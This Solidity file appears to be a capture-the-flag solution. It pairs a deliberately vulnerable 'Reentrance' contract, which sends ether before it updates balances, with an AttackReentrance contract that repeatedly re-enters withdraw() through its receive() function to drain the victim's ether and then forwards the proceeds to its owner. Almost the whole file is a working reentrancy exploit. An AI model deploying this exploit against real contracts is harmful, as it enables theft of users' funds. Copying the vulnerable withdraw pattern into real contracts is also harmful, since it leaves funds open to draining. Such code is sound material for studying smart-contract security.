// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "@openzeppelin/contracts-3.4.1/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract AttackReentrance {
    uint256 sentAmount;
    address payable owner;
    Reentrance reentrance;

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this!");
        _;
    }

    function attack(address payable _reentrance) public payable {
        reentrance = Reentrance(_reentrance);
        sentAmount = msg.value;

        // let's donate some ether so that we can pass the conditional statement in the `withdraw` function
        reentrance.donate{value: msg.value}(address(this));

        // let's perform the first withdrawal
        reentrance.withdraw(sentAmount);
    }

    function withdraw() public onlyOwner {
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "Could not complete transfer of ETH");
    }

    receive() external payable {
        if (address(reentrance).balance >= sentAmount) {
            reentrance.withdraw(sentAmount);
        }
    }
}
